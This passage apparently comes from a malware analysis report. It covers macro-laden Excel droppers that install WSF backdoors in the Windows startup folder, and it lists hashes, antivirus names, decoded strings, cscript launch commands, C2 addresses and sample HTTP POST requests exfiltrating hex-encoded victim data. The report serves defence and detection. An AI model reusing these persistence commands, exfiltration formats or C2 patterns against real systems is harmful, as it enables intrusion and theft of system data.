terminators\n\n\nMD5\ne182a861616a9f12bc79988e6a4186af\n\n\nSHA1\n69840d4c4755cdab01527eacbb48577d973f7157\n\n\nSHA256\nc2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e\n\n\nSHA512\n0eb88fe297d296569063874bead48c8b2998edc6779f5777f533de241fa49d7cb4aadc189bcdd07783ad2d669ac35344b2385c62859bc5b0c6fbe55e4857002b\n\n\nssdeep\n192:qK8Lkrc2HWT1jbAaBLGFNN68RNEFQQrrl+lBAlJlgQGtb0UqQYGQrQoGuQgQXPY5:qK82ZWTd/LYNBRNEFl+l2lJlGdPUlcKp\n\n\nEntropy\n4.062618\n\n\nPath\n%AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Outlook.wsf\n\n\n\nAntivirus\n\n\n\nAvira\nVBS/Dldr.Agent.HC\n\n\nBitdefender\nTrojan.Generic.31341871\n\n\nESET\nVBS/Agent.PMK trojan\n\n\nEmsisoft\nTrojan.Generic.31341871 (B)\n\n\nIKARUS\nTrojan.VBS.Agent\n\n\nLavasoft\nTrojan.Generic.31341871\n\n\nMcAfee\nVBS/Agent.hw\n\n\nQuick Heal\nVBS.Downloader.45256\n\n\nSophos\nTroj/HTA-AB\n\n\nSymantec\nVBS.Downloader.Trojan\n\n\nTrend Micro\nTROJ_FR.A1B65C22\n\n\nTrend Micro HouseCall\nTROJ_FR.A1B65C22\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nc2badcdfa9...\nDropped_By\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\n\n\n\nDescription\nThis artifact is a wsf file installed by Cooperation terms.xls (026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141). This file is installed into the current user startup folder to run automatically at startup. The file contains hexadecimal (hex)-encoded strings that have been reshuffled. When executed, the malware uses built-in algorithms to arrange and hex decode these strings.\n\n\t\t\tDisplayed below are strings of interest decoded during runtime:\n\n\t\t\t--Begin strings--\n\t\t\t\"okppQO4Hbr0n3PBQt78IQhFQlIvXjWRu.run PprJwVD1jVboW9s2WjL9uCH1Jk02tisB,0,TRUE\"\n\t\t\t\"cmd.exe /c cscript.exe %ProgramData%\\\\Outlook.wsf jaguar_plus\"\n\t\t\t--End strings--\n\n\t\t\tIt executes the command below to run the wsf file \"%ProgramData%\\Outlook.wsf\" (f10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0) with the argument \"jaguar_plus\".\n\n\t\t\tDisplayed below is the command:\n\n\t\t\t--Begin command--\n\t\t\t\"cmd.exe /c cscript.exe %ProgramData%\\\\Outlook.wsf jaguar_plus\"\n\t\t\t--End command--\nScreenshots\n \n\nFigure 17 - The contents of the VBscript.\n\n\n\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nOutlook.wsf\n\n\nSize\n34242 bytes\n\n\nType\nHTML document, Little-endian UTF-16 Unicode text, with very long lines, with CRLF line terminators\n\n\nMD5\nb3504546810e78304e879df76d4eec46\n\n\nSHA1\nd02d93b707ac999fde0545792870a2b82dc3a238\n\n\nSHA256\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\n\n\nSHA512\nd7a78259988e17b1487a3cc2a3a8ba7aaa1cae8904b2ee3da79a6a77266822f726a367cda9c1b59aab3cf369ebf5bec1f279e8e6ff036376073f8a20e3053576\n\n\nssdeep\n384:NaeE4zZlbO1/RW8upzK2Hkq3+LBOuCBSnUosLCFt9tMRYCnFCg+tJCXw2V3:NaeEpu9VEU+LQEsMt9tUl+ta\n\n\nEntropy\n3.699753\n\n\nPath\nC:\\ProgramData\\Outlook.wsf\n\n\n\nAntivirus\n\n\n\nAvira\nJS/Dldr.Agent.bah\n\n\nIKARUS\nJS.Trojan-Downloader.Agent\n\n\nMcAfee\nVBS/Downloader.aak\n\n\nNANOAV\nTrojan.Script.Vbs-heuristic.druvzi\n\n\nQuick Heal\nVBS.Downloader.45256\n\n\nSophos\nTroj/HTA-AB\n\n\nSymantec\nTrojan Horse\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nf10471e15c...\nDropped_By\n026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141\n\n\nf10471e15c...\nConnected_To\n88.119.170.124\n\n\n\nDescription\nThis artifact is a wsf file installed by Cooperation terms.xls (026868713d60e6790f41dc7046deb4e6795825faa903113d2f22b644f0d21141) and executed by Outlook.wsf (c2badcdfa9b7ece00f245990bb85fb6645c05b155b77deaf2bb7a2a0aacbe49e). The file contains hex-encoded strings that have been reshuffled. When executed, the malware uses built-in algorithms to arrange and hex decodes these strings.\n\n\t\t\tDisplayed below are strings of interest decoded during runtime:\n\n\t\t\t--Begin strings--\n\t\t\t{impersonationLevel=impersonate}!\\\\\\\\\n\t\t\t%AppData%\\\\Local\\\\Temp\\\\h.txt\n\t\t\tezedcjrfvjriftmldedu\n\t\t\tlcekcnkxkbllmwlpoklgof\n\t\t\thttp[:]//88[.]119[.]170[.]124/\n\t\t\tPOST\n\t\t\tE442779124B3E37D2A3F77D77B66A.Open H9C223C34C88AD14FAD121E5E9C968,FFCC6585A837E41D4D73CB795EA25,False\"\n\t\t\tE442779124B3E37D2A3F77D77B66A.send H9C223C34C88AD14FAD121E5E9C968\"\n\t\t\tcmd.exe /c\n\t\t\t>> %temp%\\\\h.txt\n\t\t\tSelect * from Win32_IP4RouteTable\n\t\t\t\"%COMPUTERNAME%\"\n\t\t\t\"%USERNAME%\"\n\t\t\t--End strings--\n\n\t\t\tIt collects the victim's system IP address, computer name, and username in the format below:\n\n\t\t\t--Begin information--\n\t\t\tFormat: [victim's system Internet Protocol address]|#@*@#|[Computer name]/Username\n\t\t\tSample: \"19x.1xx.2xx.2xx|#@*@#|WIN-HVMLL1IR74C/user01\"\n\t\t\t--End information--\n\n\t\t\tThe collected data above is hex-encoded, and the hex bytes are reshuffled and appended to a string \"vl\" before exfiltration. It will send the encoded data using the Uniform Resource Identifier (URI): \"http[:]//88[.]119[.]170[.]124/ezedcjrfvjriftmldedu\" and wait for a response.\n\n\t\t\tDisplayed below is the POST request used to exfiltrate the victim's system data:\n\n\t\t\t--Begin request--\n\t\t\tPOST /ezedcjrfvjriftmldedu HTTP/1.1\n\t\t\tConnection: Keep-Alive\n\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\tAccept: */*\n\t\t\tAccept-Language: en-us\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\tCharSet: UTF-8\n\t\t\tContent-Length: 93\n\t\t\tHost: 88[.]119[.]170[.]124\n\n\t\t\tvl=1693273632E6349334E37235340D743442D53463ED34C7CC2214A90423C5494228E4F7032293856253E6216713\n\t\t\t--End request---\n\n\t\t\tThe response payload was not available for analysis. Analysis indicates that the C2 response payloads are hex encoded and reshuffled. It uses the same built-in algorithm to arrange and hex decode these payloads, which contain command-line scripts. The malware will search for the string \"|#@*@#|\" or \"/!*##*!/\" in the decoded payload. If the payload contains one of these strings, it will parse the command-line scripts for execution using the command below:\n\n\t\t\t--Begin command--\n\t\t\t\"cmd.exe /c [decoded command scripts]| >> %temp%\\\\h.txt\"\n\t\t\t--End command--\n\n\t\t\tThe output of the command-line scripts executed is stored into a text file \"%temp%\\h.txt\". It reads the output of the command executed from the text file \"%temp%\\h.txt\" and attaches it to the victim's system IP address, computer name, and username in the format below:\n\n\t\t\t--Begin format--\n\t\t\tFormat: \"[victim's system Internet Protocol address]|#@*@#|[Computer name]/Username|#@*@#|[Output of the command executed]\"\n\n\t\t\tSample observed: \"19x.1xx.2xx.2xx|#@*@#|WIN-HVMLL1IR74C/user01|#@*@#|\\r\\nWindows IP Configuration\\r\\n\\r\\n\\r\\nEthernet adapter Local Area Connection 2:\\r\\n\\r\\n Connection-specific DNS Suffix . : \\r\\n Link-local IPv6 Address . . . . . : fe80::d1d7:d838:2959:23d0%15\\r\\n IPv4 Address. . . . . . . . . . . : 19x.1xx.2xx.1xx\\r\\n Subnet Mask . . . . . . . . . . . : 255.255.255.0\\r\\n Default Gateway . . . . . . . . . : 19x.1xx.2xx.2xx\\r\\n\\r\\nEthernet adapter Local Area Connection:\\r\\n\\r\\n Media State . . . . . . . . . . . : Media disconnected\\r\\n Connection-specific DNS Suffix . : \\r\\n\\r\\nTunnel adapter isatap.{62D6C817-FD7E-4634-83CF-3311F44F4490}:\\r\\n\\r\\n Media State . . . . . . . . . . . : Media disconnected\\r\\n Connection-specific DNS Suffix . : \\r\\n\\r\\nTunnel adapter Teredo Tunneling Pseudo-Interface:\\r\\n\\r\\n Connection-specific DNS Suffix . : \\r\\n IPv6 Address. . . . . . . . . . . : 2001:0:c000:27b:c2f:3a2f:3f57:2e63\\r\\n Link-local IPv6 Address . . . . . : fe80::c2f:3a2f:3f57:2e63%12\\r\\n Default Gateway . . . . . . . . . : ::\\r\\n\\r\\nTunnel adapter isatap.{43E8EDE4-433A-453E-B583-1A994D8B33E2}:\\r\\n\\r\\n Media State . . . . . . . . . . . : Media disconnected\\r\\n Connection-specific DNS Suffix . : \\r\\n\"\n\t\t\t--End format--\n\n\t\t\tThe above victim's system's information and the output command data are hex-encoded, and the hex bytes are re-ordered and appended to a string \"vl\" before exfiltration. It will send the encoded data using the URI: \"http[:]//88[.]119[.]170[.]124/lcekcnkxkbllmwlpoklgof\" and wait for a response (next command).\n\n\t\t\tDisplayed below is the POST request used to exfiltrate the victim's system data and the output of the command executed:\n\n\t\t\t--Begin request--\n\t\t\tPOST /lcekcnkxkbllmwlpoklgof HTTP/1.1\n\t\t\tConnection: Keep-Alive\n\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\tAccept: */*\n\t\t\tAccept-Language: en-us\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\tCharSet: UTF-8\n\t\t\tContent-Length: 9813\n\t\t\tHost: 88[.]119[.]170[.]124\n\n\t\t\tvl=[re-ordered hex-encoded victim's system data and the output of the command executed]\n\t\t\t--End request---\n\n\t\t\tDisplayed below is sample POST request that contains the encoded victim's system data and the output of the command executed:\n\n\t\t\t--Begin request--\n\t\t\tPOST /lcekcnkxkbllmwlpoklgof HTTP/1.1\n\t\t\tConnection: Keep-Alive\n\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\tAccept: */*\n\t\t\tAccept-Language: en-us\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\tCharSet: UTF-8\n\t\t\tContent-Length: 5689\n\t\t\tHost: 88[.]119[.]170[.]124\n\n\t\t\tvl=A093273633E2339332927232320A723242D6E6D346365E7226F466E77467273E265674D6469267477C024204601063744215623203A2E202224279426216621227E262052222240296E426262......F0E20702E4A2D2E2DAE2E29240A22252E99265D2F0320602900234705142E5F477A2F2C63066A2027EC2122220524492D8F230420F2397E6CEC225648F56E59600C63706AE0604C4410625E607022202856253E521D013\n\t\t\t--End request---\n\n\t\t\tIt is designed to send these messages below to the C2 server using the URI: \"http[:]//88[.]119[.]170[.]124/lcekcnkxkbllmwlpoklgof\". Each message sent is hex-encoded, and the hex bytes are re-ordered and appended to a string \"vl\":\n\n\t\t\t--Begin message format--\n\t\t\t\"200/!*##*!/19x.1xx.2xx.2xx|#@*@#|WIN-HVMLL1IR74C/user01\" ==> When the decoded C2 command data received contains the string \"|#@*@#|\" or \"/!*##*!/\".\n\t\t\t\"19x.1xx.2xx.2xx|#@*@#|WIN-HVMLL1IR74C/user01|#@*@#|sory\" ==> When a command or a specific task fails\n\t\t\t--End message format--\nScreenshots\n \n\nFigure 18 - The contents of the VBscript.\n\n\n\n88.119.170.124\nTags\ncommand-and-control\nHTTP Sessions\n\nPOST /ezedcjrfvjriftmldedu HTTP/1.1\n\t\t\t\tConnection: Keep-Alive\n\t\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\t\tAccept: */*\n\t\t\t\tAccept-Language: en-us\n\t\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\t\tCharSet: UTF-8\n\t\t\t\tContent-Length: 93\n\t\t\t\tHost: 88.119.170.124\nPOST /lcekcnkxkbllmwlpoklgof HTTP/1.1\n\t\t\t\tConnection: Keep-Alive\n\t\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\t\tAccept: */*\n\t\t\t\tAccept-Language: en-us\n\t\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\t\tCharSet: UTF-8\n\t\t\t\tContent-Length: 9813\n\t\t\t\tHost: 88.119.170.124\n\nWhois\nDomain Name: bacloud.info\n\t\t\tRegistry Domain ID: 9ae51aee8f3144059e17d8f8fba3095e-DONUTS\n\t\t\tRegistrar WHOIS Server: whois.PublicDomainRegistry.com\n\t\t\tRegistrar URL: http://www.PublicDomainRegistry.com\n\t\t\tUpdated Date: 2021-03-09T06:39:04Z\n\t\t\tCreation Date: 2010-04-22T12:46:58Z\n\t\t\tRegistry Expiry Date: 2022-04-22T12:46:58Z\n\t\t\tRegistrar: PDR Ltd. d/b/a PublicDomainRegistry.com\n\t\t\tRegistrar IANA ID: 303\n\t\t\tRegistrar Abuse Contact Email: abuse@publicdomainregistry.com\n\t\t\tRegistrar Abuse Contact Phone: +91.2230797500\n\t\t\tDomain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n\t\t\tRegistry Registrant ID: REDACTED FOR PRIVACY\n\t\t\tRegistrant Name: REDACTED FOR PRIVACY\n\t\t\tRegistrant Organization: GDPR Masked\n\t\t\tRegistrant Street: REDACTED FOR PRIVACY\n\t\t\tRegistrant City: REDACTED FOR PRIVACY\n\t\t\tRegistrant State/Province: GDPR Masked\n\t\t\tRegistrant Postal Code: REDACTED FOR PRIVACY\n\t\t\tRegistrant Country: US\n\t\t\tRegistrant Phone: REDACTED FOR PRIVACY\n\t\t\tRegistrant Phone Ext: REDACTED FOR PRIVACY\n\t\t\tRegistrant Fax: REDACTED FOR PRIVACY\n\t\t\tRegistrant Fax Ext: REDACTED FOR PRIVACY\n\t\t\tRegistrant Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.\n\t\t\tRegistry Admin ID: REDACTED FOR PRIVACY\n\t\t\tAdmin Name: REDACTED FOR PRIVACY\n\t\t\tAdmin Organization: REDACTED FOR PRIVACY\n\t\t\tAdmin Street: REDACTED FOR PRIVACY\n\t\t\tAdmin City: REDACTED FOR PRIVACY\n\t\t\tAdmin State/Province: REDACTED FOR PRIVACY\n\t\t\tAdmin Postal Code: REDACTED FOR PRIVACY\n\t\t\tAdmin Country: REDACTED FOR PRIVACY\n\t\t\tAdmin Phone: REDACTED FOR PRIVACY\n\t\t\tAdmin Phone Ext: REDACTED FOR PRIVACY\n\t\t\tAdmin Fax: REDACTED FOR PRIVACY\n\t\t\tAdmin Fax Ext: REDACTED FOR PRIVACY\n\t\t\tAdmin Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.\n\t\t\tRegistry Tech ID: REDACTED FOR PRIVACY\n\t\t\tTech Name: REDACTED FOR PRIVACY\n\t\t\tTech Organization: REDACTED FOR PRIVACY\n\t\t\tTech Street: REDACTED FOR PRIVACY\n\t\t\tTech City: REDACTED FOR PRIVACY\n\t\t\tTech State/Province: REDACTED FOR PRIVACY\n\t\t\tTech Postal Code: REDACTED FOR PRIVACY\n\t\t\tTech Country: REDACTED FOR PRIVACY\n\t\t\tTech Phone: REDACTED FOR PRIVACY\n\t\t\tTech Phone Ext: REDACTED FOR PRIVACY\n\t\t\tTech Fax: REDACTED FOR PRIVACY\n\t\t\tTech Fax Ext: REDACTED FOR PRIVACY\n\t\t\tTech Email: Please query the RDDS service of the Registrar of Record identified in this output for information on how to contact the Registrant, Admin, or Tech contact of the queried domain name.\n\t\t\tName Server: dns1.laisvas.lt\n\t\t\tName Server: ns3.laisvas.lt\n\t\t\tName Server: ns5.laisvas.lt\n\t\t\tDNSSEC: unsigned\n\t\t\tURL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n\t\t\t>>> Last update of WHOIS database: 2022-02-01T10:54:20Z <<\nRelationships\n\n\n\n88.119.170.124\nConnected_From\nf10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0\n\n\n\nDescription\nThe malware C2 IP address.\n\n\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\nTags\ndownloaderdropperloadertrojan\nDetails\n\n\n\nName\nZaibCb15Ak.xls\n\n\nSize\n254976 bytes\n\n\nType\nComposite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Name of Creating Application: Microsoft Excel, Create Time/Date: Mon Nov 1 07:15:30 2021, Last Saved Time/Date: Mon Nov 1 07:17:43 2021, Security: 0\n\n\nMD5\n6cef87a6ffb254bfeb61372d24e1970a\n\n\nSHA1\ne21d95b648944ad2287c6bc01fcc12b05530e455\n\n\nSHA256\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\n\n\nSHA512\na99ca0f86da547d2979bd854b29824da77472b16aa2d2dcbc0e5c3eb4b488ae69f9d3006bc326b52b9145076247b64ba55cacfaaf30e417ea8d4f71447d682aa\n\n\nssdeep\n6144:8k3hOdsylKlgryzc4bNhZF+E+W2knArYi4uU4pVZ8lx+tSea4awSi:PiLZpVZ8lx+tna4TZ\n\n\nEntropy\n7.232043\n\n\n\nAntivirus\n\n\n\nAntiy\nTrojan[Downloader]/MSOffice.Agent.gho\n\n\nAvira\nW97M/Hancitor.tnvir\n\n\nBitdefender\nTrojan.Generic.31220507\n\n\nESET\na variant of Generik.GHODWTC trojan\n\n\nEmsisoft\nTrojan.Generic.31220507 (B)\n\n\nIKARUS\nTrojan.SuspectCRC\n\n\nLavasoft\nTrojan.Generic.31220507\n\n\nMcAfee\nRDN/Woreflint\n\n\nNANOAV\nTrojan.Ole2.Vbs-heuristic.druvzi\n\n\nNETGATE\nTrojan.Win32.Malware\n\n\nQuick Heal\nOle.Trojan.A3288643\n\n\nSophos\nTroj/DocDl-AEVH\n\n\nSymantec\nTrojan.Mdropper\n\n\nTrend Micro\nTrojan.E78080B2\n\n\nTrend Micro HouseCall\nTrojan.E78080B2\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n4b2862a166...\nContains\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\n\n\n4b2862a166...\nContains\ned988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418\n\n\n\nDescription\nThis artifact is a malicious Excel file that contains macros written in VBA and two encoded wsf files. When the Excel file is opened, the victim will be prompted to enable macros with the \u201cEnable Content\u201d button. The macros are executed once the victim enables content. When executed, the macros decode and install the embedded wsf files into the directories below:\n\n\t\t\t--Begin files--\n\t\t\t\"%LocalAppData\\Outlook.wsf\"\n\t\t\t\"%AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Outlook.wsf\"\n\t\t\t--End files--\nScreenshots\n \n\nFigure 19 - The contents of the Excel file.\n\n\n\ned988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418\nDetails\n\n\n\nName\nOutlook.wsf\n\n\nSize\n11980 bytes\n\n\nType\nHTML document, Little-endian UTF-16 Unicode text, with CRLF line terminators\n\n\nMD5\ne1f97c819b1d26748ed91777084c828e\n\n\nSHA1\n4209a007fcf4d4913afad323eb1d1ae466f911a6\n\n\nSHA256\ned988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418\n\n\nSHA512\n8a98999bc6ff4094b5e1d795e32345aca4e70b8e91ad1e4ba3f6ec6dabcf5591dc5c9740e6c326b23c6120b847611006d86e56dd2590ce30cf76eb076723f477\n\n\nssdeep\n192:/LsEDuNb8pWGNm91llKk8YwB4o6N8M6sBISa9FE8mJSZbHCExZ9EEFaeYuan:zsquN4K/aHYa42saSstmJSZbxZLK\n\n\nEntropy\n4.063463\n\n\nPath\n%AppData%\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Outlook.wsf\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\ned988768f5...\nContained_Within\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\n\n\n\nDescription\nThis artifact is a wsf file installed by ZaibCb15Ak.xls (4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c). This file is installed into the current user startup folder to run automatically at startup. The file contains hex-encoded strings that have been reshuffled. When executed, the malware uses built-in algorithms to arrange and hex decode these strings.\n\n\t\t\tDisplayed below are strings of interest decoded during runtime:\n\n\t\t\t--Begin strings--\n\t\t\t\"vqFIPLLYRjbxR8Km3m9p1ACzyK4Zps20.run PprJwVD1jVboW9s2WjL9uCH1Jk02tisB,0,TRUE\"\n\t\t\t\"cmd.exe /c cscript.exe %LocalAppData%\\\\Outlook.wsf humpback__whale\"\n\t\t\t--End strings--\n\n\t\t\tIt executes the command below to run the wsf file \"%LocalAppData%\\Outlook.wsf (d77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0) with the argument \"humpback__whale\".\n\n\t\t\tDisplayed below is the command:\n\n\t\t\t--Begin command--\n\t\t\t\"cmd.exe /c cscript.exe %LocalAppData%\\\\Outlook.wsf humpback__whale\"\n\t\t\t--End command--\nScreenshots\n \n\nFigure 20 - The contents of the VBscript.\n\n\n\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nOutlook.wsf\n\n\nSize\n40674 bytes\n\n\nType\nHTML document, Little-endian UTF-16 Unicode text, with very long lines, with CRLF line terminators\n\n\nMD5\ncb84c6b5816504c993c33360aeec4705\n\n\nSHA1\n9f212961d1de465c20e84f3c4d8ac0302e02ce37\n\n\nSHA256\nd77e268b746cf1547e7ed662598f8515948562e1d188a7f9ddb8e00f4fd94ef0\n\n\nSHA512\nfec12d5871544bf1d3038baa2c209ceb4b8c8c852b60a222d2e0486b15593cecd26e130bdadcf0927e5f556cca42d3a0bb764fcc00b685a0e464531d36a7c156\n\n\nssdeep\n768:Wqy5Dr1BE9cmvcmPcvmzm/mAm6zYAr8LBFMwEVxLa3knrjrSK0rvdRz0nq8Fj:Vy5zE9V1cnHCkn3+vdRz0nqG\n\n\nEntropy\n4.028422\n\n\nPath\n%LocalAppData%\\Outlook.wsf\n\n\n\nAntivirus\n\n\n\nAvira\nVBS/Dldr.Agent.LE\n\n\nIKARUS\nVBS.Trojan-Downloader.Agent\n\n\nNANOAV\nTrojan.Script.Vbs-heuristic.druvzi\n\n\nQuick Heal\nVBS.Downloader.45256\n\n\nSophos\nTroj/HTA-AB\n\n\nSymantec\nVBS.Downloader.Trojan\n\n\n\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nd77e268b74...\nContained_Within\n4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c\n\n\nd77e268b74...\nConnected_To\n5.199.133.149\n\n\n\nDescription\nThis artifact is a wsf file installed by ZaibCb15Ak.xls (4b2862a1665a62706f88304406b071a5c9a6b3093daadc073e174ac6d493f26c)\n\t\t\tand executed by Outlook.wsf (ed988768f50f1bb4cc7fb69f9633d6185714a99ecfd18b7b1b88a42a162b0418) . This file and \"Outlook.wsf (f10471e15c6b971092377c524a0622edf4525acee42f4b61e732f342ea7c0df0) have similar code functions. The file contains hex-encoded strings that have been reshuffled. When executed, the malware uses built-in algorithms to arrange and hex decode these strings.\n\n\t\t\tDisplayed below are strings of interest decoded during runtime:\n\n\t\t\t--Begin strings--\n\t\t\t{impersonationLevel=impersonate}!\\\\\\\\\n\t\t\t%AppData%\\\\Local\\\\Temp\\\\stari.txt\n\t\t\tstari.txt\n\t\t\tjznkmustntblvmdvgcwbvqb\n\t\t\toeajgyxyxclqmfqayv\n\t\t\thttp[:]//5[.]199[.]133[.]149/\n\t\t\tPOST\n\t\t\tcmd.exe /c\n\t\t\t>> %temp%\\\\stari.txt\n\t\t\tSelect * from Win32_IP4RouteTable\n\t\t\t\"%COMPUTERNAME%\"\n\t\t\t\"%USERNAME%\"\n\t\t\tE442779124B3E37D2A3F77D77B66A.Open jQ8EVB2A05RmlH0YGkge7CpSBNWN1n2d,KVj42Vxufd0LRBFfZDVj3wRxJ5CX9vOX,False\n\t\t\tE442779124B3E37D2A3F77D77B66A.send jQ8EVB2A05RmlH0YGkge7CpSBNWN1n2d\n\t\t\t--End strings--\n\n\t\t\tIt collects the victim's system IP address, computer name, and username in the format below:\n\n\t\t\t--Begin information--\n\t\t\tFormat: [victim's system Internet Protocol address]|!)!)!|[Computer name]/Username\n\t\t\tSample: \"19x.1xx.2xx.2xx|!)!)!|WIN-HVMLL1IR74C/user01\"\n\t\t\t--End information--\n\n\t\t\tThe collected data above is hex-encoded, and the hex bytes are reshuffled and appended to a string \"vl\" before exfiltration. It will send the encoded data using the URI: \"http[:]//5[.]199[.]133[.]149/jznkmustntblvmdvgcwbvqb\" and wait for a response.\n\n\t\t\tDisplayed below is the POST request used to exfiltrate the victim's system data:\n\n\t\t\t--Begin request--\n\t\t\tPOST /jznkmustntblvmdvgcwbvqb HTTP/1.1\n\t\t\tConnection: Keep-Alive\n\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\tAccept: */*\n\t\t\tAccept-Language: en-us\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\tCharSet: UTF-8\n\t\t\tContent-Length: 93\n\t\t\tHost: 5[.]199[.]133[.]149\n\n\t\t\tvl=6793263635E4329334937215349F743442D53463ED3....7CC2212199221C5494228E4F70322D38562E3E6212713\n\t\t\t--End request---\n\n\t\t\tThe response payload was not available for analysis. Analysis indicates that the C2 response payloads are hex-encoded and reshuffled. It uses the same built in algorithm to arrange and hex decode these payloads, which contain command-line scripts. The malware will search for the string \"|!)!)!|\" or \"/!&^^&!/\" in the decoded payload. If the payload contains one of these strings, it will parse the command-line scripts for execution using the command below:\n\n\t\t\t--Begin command--\n\t\t\t\"cmd.exe /c [decoded command scripts]| >> %temp%\\\\stari.txt\"\n\t\t\t--End command--\n\n\t\t\tThe output of the command-line scripts executed is stored into a text file \"%temp%\\stari.txt\". It reads the output of the command executed from the text file \"%temp%\\stari.txt\" and attaches it to the victim's system IP address, computer name, and username in the format below:\n\n\t\t\t--Begin format--\n\t\t\tFormat: \"[victim's system Internet Protocol address]|!)!)!|[Computer name]/Username|!)!)!|[Output of the command executed]\"\n\n\t\t\tSample: \"19x.1xx.2xx.2xx|!)!)!|WIN-HVMLL1IR74C/user01|!)!)!|\\r\\nWindows IP Configuration\\r\\n\\r\\n\\r\\nEthernet adapter Local Area Connection 2:\\r\\n\\r\\n Connection-specific DNS Suffix . : \\r\\n Link-local IPv6 Address . . . . . : fe80::d1d7:d838:2959:23d0%15\\r\\n IPv4 Address. . . . . . . . . . . : 19x.1xx.2xx.1xx\\r\\n Subnet Mask . . . . . . . . . . . : 255.255.255.0\\r\\n Default Gateway . . . . . . . . . : 19x.1xx.2xx.2xx\\r\\n\\r\\nEthernet adapter Local Area Connection:\\r\\n\\r\\n Media State . . . . . . . . . . . : Media disconnected\\r\\n Connection-specific DNS Suffix . : \\r\\n\\r\\nTunnel adapter isatap.{62D6C817-FD7E-4634-83CF-3311F44F4490}:\\r\\n\\r\\n Media State . . . . . . . . . . . : Media disconnected\\r\\n Connection-specific DNS Suffix . : \\r\\n\\r\\nTunnel adapter Teredo Tunneling Pseudo-Interface:\\r\\n\\r\\n Connection-specific DNS Suffix . : \\r\\n IPv6 Address. . . . . . . . . . . : 2001:0:c000:27b:c2f:3a2f:3f57:2e63\\r\\n Link-local IPv6 Address . . . . . : fe80::c2f:3a2f:3f57:2e63%12\\r\\n Default Gateway . . . . . . . . . : ::\\r\\n\\r\\nTunnel adapter isatap.{43E8EDE4-433A-453E-B583-1A994D8B33E2}:\\r\\n\\r\\n Media State . . . . . . . . . . . : Media disconnected\\r\\n Connection-specific DNS Suffix . : \\r\\n\"\n\t\t\t--End format--\n\n\t\t\tThe above victim's system information and the output command executed are hex-encoded, and the hex bytes are re-ordered and appended to a string \"vl\" before exfiltration. It will send the encoded data using the URI: \"http[:]//5[.]199[.]133[.]149/oeajgyxyxclqmfqayv\" and wait for a response (next command).\n\n\t\t\tDisplayed below is the POST request used to exfiltrate the victim's system data and the output of the command executed:\n\n\t\t\t--Begin request--\n\t\t\tPOST /oeajgyxyxclqmfqayv HTTP/1.1\n\t\t\tConnection: Keep-Alive\n\t\t\tContent-Type: application/x-www-form-urlencoded; Charset=UTF-8\n\t\t\tAccept: */*\n\t\t\tAccept-Language: en-us\n\t\t\tUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\n\t\t\tCharSet: UTF-8\n\t\t\tContent-Length: 93\n\t\t\tHost: 5[.]199[.]133[.]149\n\n\t\t\tvl=[re-ordered hex-encoded victim's system data and the output of the command executed]\n\t\t\t--End 